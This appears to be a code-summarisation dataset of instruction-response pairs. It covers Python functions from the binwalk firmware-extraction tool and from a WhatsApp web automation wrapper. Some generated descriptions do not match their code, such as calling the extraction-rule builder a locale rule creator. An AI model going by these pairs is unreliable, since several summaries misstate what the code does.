{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef strings(filename, minimum=4):\n    '''\n    A strings generator, similar to the Unix strings utility.\n\n    @filename - The file to search for strings in.\n    @minimum  - The minimum string length to search for.\n\n    Yeilds printable ASCII strings from filename.\n    '''\n    result = \"\"\n\n    with BlockFile(filename) as f:\n        while True:\n            (data, dlen) = f.read_block()\n            if dlen < 1:\n                break\n\n            for c in data:\n                if c in string.printable:\n                    result += c\n                    continue\n                elif len(result) >= minimum:\n                    yield result\n                    result = \"\"\n                else:\n                    result = \"\"", "response": "A generator that returns a list of strings from a file."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef bytes2str(bs):\n    '''\n    For cross compatibility between Python 2 and Python 3 strings.\n    '''\n    if isinstance(bs, type(b'')) and PY_MAJOR_VERSION > 2:\n        return bs.decode('latin1')\n    else:\n        return bs", "response": "Convert a byte string to a unicode string."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\ncreate a set of rules for the current locale.", "response": "def create_rule(self, txtrule=None, regex=None, extension=None, cmd=None, codes=[0, None], recurse=True):\n        '''\n        Adds a set of rules to the extraction rule list.\n\n        @txtrule   - Rule string, or list of rule strings, in the format <regular expression>:<file extension>[:<command to run>]\n        @regex     - If rule string is not specified, this is the regular expression string to use.\n        @extension - If rule string is not specified, this is the file extension to use.\n        @cmd       - If rule string is not specified, this is the command to run.\n                     Alternatively a callable object may be specified, which will be passed one argument: the path to the file to extract.\n        @codes     - A list of valid return codes for the extractor.\n        @recurse   - If False, extracted directories will not be recursed into when the matryoshka option is enabled.\n\n        Returns None.\n        '''\n        rules = []\n        created_rules = []\n        match = False\n        r = {\n            'extension': '',\n            'cmd': '',\n            'regex': None,\n            'codes': codes,\n            'recurse': recurse,\n        }\n\n        # Process single explicitly specified rule\n        if not txtrule and regex and extension:\n            r['extension'] = extension\n            r['regex'] = re.compile(regex)\n            if cmd:\n                r['cmd'] = cmd\n\n            return [r]\n\n        # Process rule string, or list of rule strings\n        if not isinstance(txtrule, type([])):\n            rules = [txtrule]\n        else:\n            rules = txtrule\n\n        for rule in rules:\n            r['cmd'] = ''\n            r['extension'] = ''\n\n            try:\n                values = self._parse_rule(rule)\n                match = values[0]\n                r['regex'] = re.compile(values[0])\n                r['extension'] = values[1]\n                r['cmd'] = values[2]\n                r['codes'] = values[3]\n                r['recurse'] = values[4]\n            except KeyboardInterrupt as e:\n                raise e\n            except Exception:\n                pass\n\n            # Verify that the match string was retrieved.\n            if match:\n                created_rules.append(r)\n\n        return created_rules"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef remove_rules(self, description):\n        '''\n        Remove all rules that match a specified description.\n\n        @description - The description to match against.\n\n        Returns the number of rules removed.\n        '''\n        rm = []\n        description = description.lower()\n\n        for i in range(0, len(self.extract_rules)):\n            if self.extract_rules[i]['regex'].search(description):\n                rm.append(i)\n\n        for i in rm:\n            self.extract_rules.pop(i)\n\n        return len(rm)", "response": "Removes all rules that match a specified description."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nedit all rules that match a specified description.", "response": "def edit_rules(self, description, key, value):\n        '''\n        Edit all rules that match a specified description.\n\n        @description - The description to match against.\n        @key         - The key to change for each matching rule.\n        @value       - The new key value for each matching rule.\n\n        Returns the number of rules modified.\n        '''\n        count = 0\n        description = description.lower()\n\n        for i in range(0, len(self.extract_rules)):\n            if self.extract_rules[i]['regex'].search(description):\n                if has_key(self.extract_rules[i], key):\n                    self.extract_rules[i][key] = value\n                    count += 1\n\n        return count"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef get_rules(self, description=None):\n        '''\n        Returns a list of extraction rules that match a given description.\n\n        @description - The description to match against.\n\n        Returns a list of extraction rules that match the given description.\n        If no description is provided, a list of all rules are returned.\n        '''\n        if description:\n            rules = []\n            description = description.lower()\n            for i in range(0, len(self.extract_rules)):\n                if self.extract_rules[i]['regex'].search(description):\n                    rules.append(self.extract_rules[i])\n        else:\n            rules = self.extract_rules\n\n        return rules", "response": "Returns a list of extraction rules that match a given description."}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nload extraction rules from the specified file.", "response": "def load_from_file(self, fname):\n        '''\n        Loads extraction rules from the specified file.\n\n        @fname - Path to the extraction rule file.\n\n        Returns None.\n        '''\n        try:\n            # Process each line from the extract file, ignoring comments\n            with open(fname, 'r') as f:\n                for rule in f.readlines():\n                    self.add_rule(rule.split(self.COMMENT_DELIM, 1)[0])\n        except KeyboardInterrupt as e:\n            raise e\n        except Exception as e:\n            raise Exception(\"Extractor.load_from_file failed to load file '%s': %s\" % (fname, str(e)))"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef load_defaults(self):\n        '''\n        Loads default extraction rules from the user and system extract.conf files.\n\n        Returns None.\n        '''\n        # Load the user extract file first to ensure its rules take precedence.\n        extract_files = [\n            self.config.settings.user.extract,\n            self.config.settings.system.extract,\n        ]\n\n        for extract_file in extract_files:\n            if extract_file:\n                try:\n                    self.load_from_file(extract_file)\n                except KeyboardInterrupt as e:\n                    raise e\n                except Exception as e:\n                    if binwalk.core.common.DEBUG:\n                        raise Exception(\"Extractor.load_defaults failed to load file '%s': %s\" % (extract_file, str(e)))", "response": "Loads default extraction rules from the user and system extract. conf files. Returns None."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef build_output_directory(self, path):\n        '''\n        Set the output directory for extracted files.\n\n        @path - The path to the file that data will be extracted from.\n\n        Returns None.\n        '''\n        # If we have not already created an output directory for this target\n        # file, create one now\n        if not has_key(self.extraction_directories, path):\n            basedir = os.path.dirname(path)\n            basename = os.path.basename(path)\n\n            if basedir != self.directory:\n                # During recursive extraction, extracted files will be in subdirectories\n                # of the CWD. This allows us to figure out the subdirectory by simply\n                # splitting the target file's base directory on our known CWD.\n                #\n                # However, the very *first* file being scanned is not necessarily in the\n                # CWD, so this will raise an IndexError. This is easy to handle though,\n                # since the very first file being scanned needs to have its contents\n                # extracted to ${CWD}/_basename.extracted, so we just set the subdir\n                # variable to a blank string when an IndexError is encountered.\n                try:\n                    subdir = basedir.split(self.directory)[1][1:]\n                except IndexError as e:\n                    subdir = \"\"\n            else:\n                subdir = \"\"\n\n            if self.output_directory_override:\n                output_directory = os.path.join(self.directory, subdir, self.output_directory_override)\n            else:\n                outdir = os.path.join(self.directory, subdir, '_' + basename)\n                output_directory = unique_file_name(outdir, extension='extracted')\n\n            if not os.path.exists(output_directory):\n                os.mkdir(output_directory)\n\n            self.extraction_directories[path] = output_directory\n            self.output[path].directory = os.path.realpath(output_directory) + os.path.sep\n        # Else, just use the already created directory\n        else:\n            output_directory = self.extraction_directories[path]\n\n        return output_directory", "response": "Build the output directory for extracted files."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef extract(self, offset, description, file_name, size, name=None):\n        '''\n        Extract an embedded file from the target file, if it matches an extract rule.\n        Called automatically by Binwalk.scan().\n\n        @offset      - Offset inside the target file to begin the extraction.\n        @description - Description of the embedded file to extract, as returned by libmagic.\n        @file_name   - Path to the target file.\n        @size        - Number of bytes to extract.\n        @name        - Name to save the file as.\n\n        Returns the name of the extracted file (blank string if nothing was extracted).\n        '''\n        fname = ''\n        rule = None\n        recurse = False\n        command_line = ''\n        original_dir = os.getcwd()\n        rules = self.match(description)\n        file_path = os.path.realpath(file_name)\n\n        # No extraction rules for this file\n        if not rules:\n            binwalk.core.common.debug(\"No extraction rules found for '%s'\" % description)\n            return (None, None, False, str(None))\n        else:\n            binwalk.core.common.debug(\"Found %d matching extraction rules\" % len(rules))\n\n        # Generate the output directory name where extracted files will be stored\n        output_directory = self.build_output_directory(file_name)\n\n        # Extract to end of file if no size was specified\n        if not size:\n            size = file_size(file_path) - offset\n\n        if os.path.isfile(file_path):\n            binwalk.core.common.debug(\"Changing directory to: %s\" % output_directory)\n            os.chdir(output_directory)\n\n            # Extract into subdirectories named by the offset\n            if self.extract_into_subdirs:\n                # Remove trailing L that is added by hex()\n                offset_dir = \"0x%X\" % offset\n                os.mkdir(offset_dir)\n                os.chdir(offset_dir)\n\n            # Loop through each extraction rule until one succeeds\n            for i in range(0, len(rules)):\n                rule = rules[i]\n\n                binwalk.core.common.debug(\"Processing extraction rule #%d (%s)\" % (i, str(rule['cmd'])))\n\n                # Make sure we don't recurse into any extracted directories if\n                # instructed not to\n                if rule['recurse'] in [True, False]:\n                    recurse = rule['recurse']\n                else:\n                    recurse = True\n\n                binwalk.core.common.debug(\"Extracting %s[%d:] to %s\" % (file_path, offset, name))\n\n                # Copy out the data to disk, if we haven't already\n                fname = self._dd(file_path, offset, size, rule['extension'], output_file_name=name)\n\n                # If there was a command specified for this rule, try to execute it.\n                # If execution fails, the next rule will be attempted.\n                if rule['cmd']:\n\n                    # Note the hash of the original file; if --rm is specified and the\n                    # extraction utility modifies the original file rather than creating\n                    # a new one (AFAIK none currently do, but could happen in the future),\n                    # we don't want to remove this file.\n                    if self.remove_after_execute:\n                        fname_md5 = file_md5(fname)\n\n                    binwalk.core.common.debug(\"Executing extraction command %s\" % (str(rule['cmd'])))\n\n                    # Execute the specified command against the extracted file\n                    if self.run_extractors:\n                        (extract_ok, command_line) = self.execute(rule['cmd'], fname, rule['codes'])\n                    else:\n                        extract_ok = True\n                        command_line = ''\n\n                    binwalk.core.common.debug(\"Ran extraction command: %s\" % command_line)\n                    binwalk.core.common.debug(\"Extraction successful: %s\" % extract_ok)\n\n                    # Only clean up files if remove_after_execute was specified.\n                    # Only clean up files if the file was extracted sucessfully, or if we've run\n                    # out of extractors.\n                    if self.remove_after_execute and (extract_ok == True or i == (len(rules) - 1)):\n\n                        # Remove the original file that we extracted,\n                        # if it has not been modified by the extractor.\n                        try:\n                            if file_md5(fname) == fname_md5:\n                                os.unlink(fname)\n                        except KeyboardInterrupt as e:\n                            raise e\n                        except Exception as e:\n                            pass\n\n                    # If the command executed OK, don't try any more rules\n                    if extract_ok == True:\n                        break\n                    # Else, remove the extracted file if this isn't the last rule in the list.\n                    # If it is the last rule, leave the file on disk for the\n                    # user to examine.\n                    elif i != (len(rules) - 1):\n                        try:\n                            os.unlink(fname)\n                        except KeyboardInterrupt as e:\n                            raise e\n                        except Exception as e:\n                            pass\n\n                # If there was no command to execute, just use the first rule\n                else:\n                    break\n\n            binwalk.core.common.debug(\"Changing directory back to: %s\" % original_dir)\n            os.chdir(original_dir)\n\n        return (output_directory, fname, recurse, command_line)", "response": "Extracts an embedded file from the target file."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef _entry_offset(self, index, entries, description):\n        '''\n        Gets the offset of the first entry that matches the description.\n\n        @index       - Index into the entries list to begin searching.\n        @entries     - Dictionary of result entries.\n        @description - Case insensitive description.\n\n        Returns the offset, if a matching description is found.\n        Returns -1 if a matching description is not found.\n        '''\n        description = description.lower()\n\n        for (offset, infos) in entries[index:]:\n            for info in infos:\n                if info['description'].lower().startswith(description):\n                    return offset\n        return -1", "response": "Returns the offset of the first entry that matches the description."}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nchecks to see if the provided description string matches an extract rule. Returns the associated rule dictionary ordered by priority.", "response": "def match(self, description):\n        '''\n        Check to see if the provided description string matches an extract rule.\n        Called internally by self.extract().\n\n        @description - Description string to check.\n\n        Returns the associated rule dictionary if a match is found.\n        Returns None if no match is found.\n        '''\n        rules = []\n        ordered_rules = []\n        description = description.lower()\n\n        for rule in self.extract_rules:\n            if rule['regex'].search(description):\n                rules.append(rule)\n\n        # Plugin rules should take precedence over external extraction commands.\n        for rule in rules:\n            if callable(rule['cmd']):\n                ordered_rules.append(rule)\n        for rule in rules:\n            if not callable(rule['cmd']):\n                ordered_rules.append(rule)\n\n        return ordered_rules"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef _parse_rule(self, rule):\n        '''\n        Parses an extraction rule.\n\n        @rule - Rule string.\n\n        Returns an array of ['<case insensitive matching string>', '<file extension>', '<command to run>', '<comma separated return codes>', <recurse into extracted directories: True|False>].\n        '''\n        values = rule.strip().split(self.RULE_DELIM, 4)\n\n        if len(values) >= 4:\n            codes = values[3].split(',')\n            for i in range(0, len(codes)):\n                try:\n                    codes[i] = int(codes[i], 0)\n                except ValueError as e:\n                    binwalk.core.common.warning(\"The specified return code '%s' for extractor '%s' is not a valid number!\" % (codes[i], values[0]))\n            values[3] = codes\n\n        if len(values) >= 5:\n            values[4] = (values[4].lower() == 'true')\n\n        return values", "response": "Parses an extraction rule."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nextract a file embedded inside the target file. @file_name - Path to the target file. @offset - Offset inside the target file where the embedded file begins. @size - Number of bytes to extract. @extension - The file exension to assign to the extracted file on disk. @output_file_name - The requested name of the output file. Returns the extracted file name.", "response": "def _dd(self, file_name, offset, size, extension, output_file_name=None):\n        '''\n        Extracts a file embedded inside the target file.\n\n        @file_name        - Path to the target file.\n        @offset           - Offset inside the target file where the embedded file begins.\n        @size             - Number of bytes to extract.\n        @extension        - The file exension to assign to the extracted file on disk.\n        @output_file_name - The requested name of the output file.\n\n        Returns the extracted file name.\n        '''\n        total_size = 0\n        # Default extracted file name is <displayed hex offset>.<extension>\n        default_bname = \"%X\" % (offset + self.config.base)\n\n        # Make sure the output file name is a string\n        if output_file_name is not None:\n            output_file_name = str(output_file_name)\n\n        if self.max_size and size > self.max_size:\n            size = self.max_size\n\n        if not output_file_name or output_file_name is None:\n            bname = default_bname\n        else:\n            # Strip the output file name of invalid/dangerous characters (like file paths)\n            bname = os.path.basename(output_file_name)\n\n        fname = unique_file_name(bname, extension)\n\n        try:\n            # If byte swapping is enabled, we need to start reading at a swap-size\n            # aligned offset, then index in to the read data appropriately.\n            if self.config.swap_size:\n                adjust = offset % self.config.swap_size\n            else:\n                adjust = 0\n\n            offset -= adjust\n\n            # Open the target file and seek to the offset\n            fdin = self.config.open_file(file_name)\n            fdin.seek(offset)\n\n            # Open the output file\n            try:\n                fdout = BlockFile(fname, 'w')\n            except KeyboardInterrupt as e:\n                raise e\n            except Exception as e:\n                # Fall back to the default name if the requested name fails\n                fname = unique_file_name(default_bname, extension)\n                fdout = BlockFile(fname, 'w')\n\n            while total_size < size:\n                (data, dlen) = fdin.read_block()\n                if dlen < 1:\n                    break\n                else:\n                    total_size += (dlen - adjust)\n                    if total_size > size:\n                        dlen -= (total_size - size)\n                    fdout.write(str2bytes(data[adjust:dlen]))\n                    adjust = 0\n\n            # Cleanup\n            fdout.close()\n            fdin.close()\n        except KeyboardInterrupt as e:\n            raise e\n        except Exception as e:\n            raise Exception(\"Extractor.dd failed to extract data from '%s' to '%s': %s\" %\n                            (file_name, fname, str(e)))\n\n        binwalk.core.common.debug(\"Carved data block 0x%X - 0x%X from '%s' to '%s'\" %\n                                  (offset, offset + size, file_name, fname))\n        return fname"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef execute(self, cmd, fname, codes=[0, None]):\n        '''\n        Execute a command against the specified file.\n\n        @cmd   - Command to execute.\n        @fname - File to run command against.\n        @codes - List of return codes indicating cmd success.\n\n        Returns True on success, False on failure, or None if the external extraction utility could not be found.\n        '''\n        tmp = None\n        rval = 0\n        retval = True\n        command_list = []\n\n        binwalk.core.common.debug(\"Running extractor '%s'\" % str(cmd))\n\n        try:\n            if callable(cmd):\n                command_list.append(get_class_name_from_method(cmd))\n\n                try:\n                    retval = cmd(fname)\n                except KeyboardInterrupt as e:\n                    raise e\n                except Exception as e:\n                    binwalk.core.common.warning(\"Internal extractor '%s' failed with exception: '%s'\" % (str(cmd), str(e)))\n            elif cmd:\n                # If not in debug mode, create a temporary file to redirect\n                # stdout and stderr to\n                if not binwalk.core.common.DEBUG:\n                    tmp = tempfile.TemporaryFile()\n\n                # Generate unique file paths for all paths in the current\n                # command that are surrounded by UNIQUE_PATH_DELIMITER\n                while self.UNIQUE_PATH_DELIMITER in cmd:\n                    need_unique_path = cmd.split(self.UNIQUE_PATH_DELIMITER)[\n                        1].split(self.UNIQUE_PATH_DELIMITER)[0]\n                    unique_path = binwalk.core.common.unique_file_name(need_unique_path)\n                    cmd = cmd.replace(self.UNIQUE_PATH_DELIMITER + need_unique_path + self.UNIQUE_PATH_DELIMITER, unique_path)\n\n                # Execute.\n                for command in cmd.split(\"&&\"):\n\n                    # Replace all instances of FILE_NAME_PLACEHOLDER in the\n                    # command with fname\n                    command = command.strip().replace(self.FILE_NAME_PLACEHOLDER, fname)\n\n                    binwalk.core.common.debug(\"subprocess.call(%s, stdout=%s, stderr=%s)\" % (command, str(tmp), str(tmp)))\n                    rval = subprocess.call(shlex.split(command), stdout=tmp, stderr=tmp)\n\n                    if rval in codes:\n                        retval = True\n                    else:\n                        retval = False\n\n                    binwalk.core.common.debug('External extractor command \"%s\" completed with return code %d (success: %s)' % (cmd, rval, str(retval)))\n                    command_list.append(command)\n\n                    # TODO: Should errors from all commands in a command string be checked? Currently we only support\n                    #       specifying one set of error codes, so at the moment, this is not done; it is up to the\n                    #       final command to return success or failure (which presumably it will if previous necessary\n                    #       commands were not successful, but this is an assumption).\n                    # if retval == False:\n                    #    break\n\n        except KeyboardInterrupt as e:\n            raise e\n        except Exception as e:\n            binwalk.core.common.warning(\"Extractor.execute failed to run external extractor '%s': %s, '%s' might not be installed correctly\" % (str(cmd), str(e), str(cmd)))\n            retval = None\n\n        if tmp is not None:\n            tmp.close()\n\n        return (retval, '&&'.join(command_list))", "response": "Execute a command against the specified file."}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nformats a line of text to fit in the terminal window.", "response": "def _format_line(self, line):\n        '''\n        Formats a line of text to fit in the terminal window.\n        For Tim.\n        '''\n        delim = '\\n'\n        offset = 0\n        self.string_parts = []\n\n        # Split the line into an array of columns, e.g., ['0', '0x00000000',\n        # 'Some description here']\n        line_columns = line.split(None, self.num_columns - 1)\n        if line_columns:\n            # Find where the start of the last column (description) starts in the line of text.\n            # All line wraps need to be aligned to this offset.\n            offset = line.rfind(line_columns[-1])\n            # The delimiter will be a newline followed by spaces padding out\n            # the line wrap to the alignment offset.\n            delim += ' ' * offset\n\n        if line_columns and self.fit_to_screen and len(line) > self.SCREEN_WIDTH:\n            # Calculate the maximum length that each wrapped line can be\n            max_line_wrap_length = self.SCREEN_WIDTH - offset\n            # Append all but the last column to formatted_line\n            formatted_line = line[:offset]\n\n            # Loop to split up line into multiple max_line_wrap_length pieces\n            while len(line[offset:]) > max_line_wrap_length:\n                # Find the nearest space to wrap the line at (so we don't split\n                # a word across two lines)\n                split_offset = line[\n                    offset:offset + max_line_wrap_length].rfind(' ')\n                # If there were no good places to split the line, just truncate\n                # it at max_line_wrap_length\n                if split_offset < 1:\n                    split_offset = max_line_wrap_length\n\n                self._append_to_data_parts(line, offset, offset + split_offset)\n                offset += split_offset\n\n            # Add any remaining data (guarunteed to be max_line_wrap_length\n            # long or shorter) to self.string_parts\n            self._append_to_data_parts(line, offset, offset + len(line[offset:]))\n\n            # Append self.string_parts to formatted_line; each part seperated\n            # by delim\n            formatted_line += delim.join(self.string_parts)\n        else:\n            formatted_line = line\n\n        return formatted_line"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef _configure_formatting(self):\n        '''\n        Configures output formatting, and fitting output to the current terminal width.\n\n        Returns None.\n        '''\n        self.format_strings(self.DEFAULT_FORMAT, self.DEFAULT_FORMAT)\n\n        if self.fit_to_screen:\n            try:\n                import fcntl\n                import struct\n                import termios\n\n                # Get the terminal window width\n                hw = struct.unpack('hh', fcntl.ioctl(1, termios.TIOCGWINSZ, '1234'))\n                self.SCREEN_WIDTH = self.HEADER_WIDTH = hw[1]\n            except KeyboardInterrupt as e:\n                raise e\n            except Exception:\n                pass", "response": "Configures output formatting and fitting output to the current terminal width."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef _magic_signature_files(self, system_only=False, user_only=False):\n        '''\n        Find all user/system magic signature files.\n\n        @system_only - If True, only the system magic file directory will be searched.\n        @user_only   - If True, only the user magic file directory will be searched.\n\n        Returns a list of user/system magic signature files.\n        '''\n        files = []\n        user_binarch = self._user_path(self.BINWALK_MAGIC_DIR, self.BINARCH_MAGIC_FILE)\n        system_binarch = self._system_path(self.BINWALK_MAGIC_DIR, self.BINARCH_MAGIC_FILE)\n\n        def list_files(dir_path):\n            # Ignore hidden dotfiles.\n            return [os.path.join(dir_path, x) for x in os.listdir(dir_path) if not x.startswith('.')]\n\n        if not system_only:\n            user_dir = os.path.join(self.user_dir, self.BINWALK_USER_DIR, self.BINWALK_MAGIC_DIR)\n            files += list_files(user_dir)\n        if not user_only:\n            system_dir = os.path.join(self.system_dir, self.BINWALK_MAGIC_DIR)\n            files += list_files(system_dir)\n\n        # Don't include binarch signatures in the default list of signature files.\n        # It is specifically loaded when -A is specified on the command line.\n        if user_binarch in files:\n            files.remove(user_binarch)\n        if system_binarch in files:\n            files.remove(system_binarch)\n\n        return files", "response": "Return a list of all user and system magic signature files."}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nfind the specified magic file in the system or user magic file directories.", "response": "def find_magic_file(self, fname, system_only=False, user_only=False):\n        '''\n        Finds the specified magic file name in the system / user magic file directories.\n\n        @fname       - The name of the magic file.\n        @system_only - If True, only the system magic file directory will be searched.\n        @user_only   - If True, only the user magic file directory will be searched.\n\n        If system_only and user_only are not set, the user directory is always searched first.\n\n        Returns the path to the file on success; returns None on failure.\n        '''\n        loc = None\n\n        if not system_only:\n            fpath = self._user_path(self.BINWALK_MAGIC_DIR, fname)\n            if os.path.exists(fpath) and common.file_size(fpath) > 0:\n                loc = fpath\n\n        if loc is None and not user_only:\n            fpath = self._system_path(self.BINWALK_MAGIC_DIR, fname)\n            if os.path.exists(fpath) and common.file_size(fpath) > 0:\n                loc = fpath\n\n        return fpath"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\ngets the user s home directory.", "response": "def _get_user_dir(self):\n        '''\n        Get the user's home directory.\n        '''\n        try:\n            # This should work in both Windows and Unix environments\n            for envname in ['USERPROFILE', 'HOME']:\n                user_dir = os.getenv(envname)\n                if user_dir is not None:\n                    return user_dir\n        except KeyboardInterrupt as e:\n            raise e\n        except Exception:\n            pass\n\n        return ''"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nbuild an absolute path and creates the directory and file if they don t already exist.", "response": "def _file_path(self, dirname, filename):\n        '''\n        Builds an absolute path and creates the directory and file if they don't already exist.\n\n        @dirname  - Directory path.\n        @filename - File name.\n\n        Returns a full path of 'dirname/filename'.\n        '''\n        if not os.path.exists(dirname):\n            try:\n                os.makedirs(dirname)\n            except KeyboardInterrupt as e:\n                raise e\n            except Exception:\n                pass\n\n        fpath = os.path.join(dirname, filename)\n\n        if not os.path.exists(fpath):\n            try:\n                open(fpath, \"w\").close()\n            except KeyboardInterrupt as e:\n                raise e\n            except Exception:\n                pass\n\n        return fpath"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef _user_path(self, subdir, basename=''):\n        '''\n        Gets the full path to the 'subdir/basename' file in the user binwalk directory.\n\n        @subdir   - Subdirectory inside the user binwalk directory.\n        @basename - File name inside the subdirectory.\n\n        Returns the full path to the 'subdir/basename' file.\n        '''\n        try:\n            return self._file_path(os.path.join(self.user_dir, self.BINWALK_USER_DIR, subdir), basename)\n        except KeyboardInterrupt as e:\n            raise e\n        except Exception:\n            return None", "response": "Gets the full path to the user binwalk file."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nreturn the full path to the basename file in the system binwalk directory.", "response": "def _system_path(self, subdir, basename=''):\n        '''\n        Gets the full path to the 'subdir/basename' file in the system binwalk directory.\n\n        @subdir   - Subdirectory inside the system binwalk directory.\n        @basename - File name inside the subdirectory.\n\n        Returns the full path to the 'subdir/basename' file.\n        '''\n        try:\n            return self._file_path(os.path.join(self.system_dir, subdir), basename)\n        except KeyboardInterrupt as e:\n            raise e\n        except Exception:\n            return None"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef _decrypt_and_extract(self, fname):\n        '''\n        This does the extraction (e.g., it decrypts the image and writes it to a new file on disk).\n        '''\n        with open(fname, \"r\") as fp_in:\n            encrypted_data = fp_in.read()\n\n            decrypted_data = self._hilink_decrypt(encrypted_data)\n\n            with open(binwalk.core.common.unique_file_name(fname[:-4], \"dec\"), \"w\") as fp_out:\n                fp_out.write(decrypted_data)", "response": "This does the decryption and extraction of the image."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nlock the main thread while the subscription in running", "response": "def run():\n    print(\"Environment\", os.environ)\n    try:\n        os.environ[\"SELENIUM\"]\n    except KeyError:\n        print(\"Please set the environment variable SELENIUM to Selenium URL\")\n        sys.exit(1)\n\n    driver = WhatsAPIDriver(client='remote', command_executor=os.environ[\"SELENIUM\"])\n    print(\"Waiting for QR\")\n    driver.wait_for_login()\n    print(\"Bot started\")\n\n    driver.subscribe_new_messages(NewMessageObserver())\n    print(\"Waiting for new messages...\")\n\n    \"\"\" Locks the main thread while the subscription in running \"\"\"\n    while True:\n        time.sleep(60)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nfunctioning to save the firefox profile to the permanant one", "response": "def save_firefox_profile(self, remove_old=False):\n        \"\"\"Function to save the firefox profile to the permanant one\"\"\"\n        self.logger.info(\"Saving profile from %s to %s\" % (self._profile.path, self._profile_path))\n\n        if remove_old:\n            if os.path.exists(self._profile_path):\n                try:\n                    shutil.rmtree(self._profile_path)\n                except OSError:\n                    pass\n\n            shutil.copytree(os.path.join(self._profile.path), self._profile_path,\n                            ignore=shutil.ignore_patterns(\"parent.lock\", \"lock\", \".parentlock\"))\n        else:\n            for item in os.listdir(self._profile.path):\n                if item in [\"parent.lock\", \"lock\", \".parentlock\"]:\n                    continue\n                s = os.path.join(self._profile.path, item)\n                d = os.path.join(self._profile_path, item)\n                if os.path.isdir(s):\n                    shutil.copytree(s, d,\n                                    ignore=shutil.ignore_patterns(\"parent.lock\", \"lock\", \".parentlock\"))\n                else:\n                    shutil.copy2(s, d)\n\n        with open(os.path.join(self._profile_path, self._LOCAL_STORAGE_FILE), 'w') as f:\n            f.write(dumps(self.get_local_storage()))"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nwaiting for QR to go away", "response": "def wait_for_login(self, timeout=90):\n        \"\"\"Waits for the QR to go away\"\"\"\n        WebDriverWait(self.driver, timeout).until(\n            EC.visibility_of_element_located((By.CSS_SELECTOR, self._SELECTORS['mainPage']))\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\ngetting pairing QR code from client", "response": "def get_qr(self, filename=None):\n        \"\"\"Get pairing QR code from client\"\"\"\n        if \"Click to reload QR code\" in self.driver.page_source:\n            self.reload_qr()\n        qr = self.driver.find_element_by_css_selector(self._SELECTORS['qrCode'])\n        if filename is None:\n            fd, fn_png = tempfile.mkstemp(prefix=self.username, suffix='.png')\n        else:\n            fd = os.open(filename, os.O_RDWR | os.O_CREAT)\n            fn_png = os.path.abspath(filename)\n        self.logger.debug(\"QRcode image saved at %s\" % fn_png)\n        qr.screenshot(fn_png)\n        os.close(fd)\n        return fn_png"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nfetching list of all contacts", "response": "def get_contacts(self):\n        \"\"\"\n        Fetches list of all contacts\n        This will return chats with people from the address book only\n        Use get_all_chats for all chats\n\n        :return: List of contacts\n        :rtype: list[Contact]\n        \"\"\"\n        all_contacts = self.wapi_functions.getAllContacts()\n        return [Contact(contact, self) for contact in all_contacts]"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nfetches list of added contacts", "response": "def get_my_contacts(self):\n        \"\"\"\n        Fetches list of added contacts\n\n        :return: List of contacts\n        :rtype: list[Contact]\n        \"\"\"\n        my_contacts = self.wapi_functions.getMyContacts()\n        return [Contact(contact, self) for contact in my_contacts]"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nfetching all chats in the system", "response": "def get_all_chats(self):\n        \"\"\"\n        Fetches all chats\n\n        :return: List of chats\n        :rtype: list[Chat]\n        \"\"\"\n        chats = self.wapi_functions.getAllChats()\n        if chats:\n            return [factory_chat(chat, self) for chat in chats]\n        else:\n            return []"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nfetching all unread messages from the server.", "response": "def get_unread(self, include_me=False, include_notifications=False, use_unread_count=False):\n        \"\"\"\n        Fetches unread messages\n        :param include_me: Include user's messages\n        :type include_me: bool or None\n        :param include_notifications: Include events happening on chat\n        :type include_notifications: bool or None\n        :param use_unread_count: If set uses chat's 'unreadCount' attribute to fetch last n messages from chat\n        :type use_unread_count: bool\n        :return: List of unread messages grouped by chats\n        :rtype: list[MessageGroup]\n        \"\"\"\n        raw_message_groups = self.wapi_functions.getUnreadMessages(include_me, include_notifications, use_unread_count)\n\n        unread_messages = []\n        for raw_message_group in raw_message_groups:\n            chat = factory_chat(raw_message_group, self)\n            messages = [factory_message(message, self) for message in raw_message_group['messages']]\n            messages.sort(key=lambda message: message.timestamp)\n            unread_messages.append(MessageGroup(chat, messages))\n\n        return unread_messages"}
